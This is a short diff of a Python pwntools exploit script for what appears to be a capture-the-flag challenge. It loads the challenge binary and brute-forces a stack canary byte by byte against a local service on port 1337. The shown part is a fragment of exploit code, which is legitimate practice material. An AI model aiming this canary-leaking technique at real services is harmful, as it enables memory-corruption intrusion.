@@ -1,4 +1,7 @@
 from pwn import *
+import os
+
+b = context.binary = ELF('/challenge/' + os.environ['CHALLENGE_NAME'])
 
 offset = False
 i = 0
@@ -35,7 +38,7 @@ while len(canary) != 8:
             i += 8
         p = remote('localhost', 1337)
         p.sendline(str(i + len(canary) + 1))
-        payload = b'A'*i + canary + bytes([j])
+        payload = b'A'*i + canary + bytes([j]) 
         p.send(payload)
         o = p.recv(256).decode('utf-8', 'ignore')
         p.info(o)
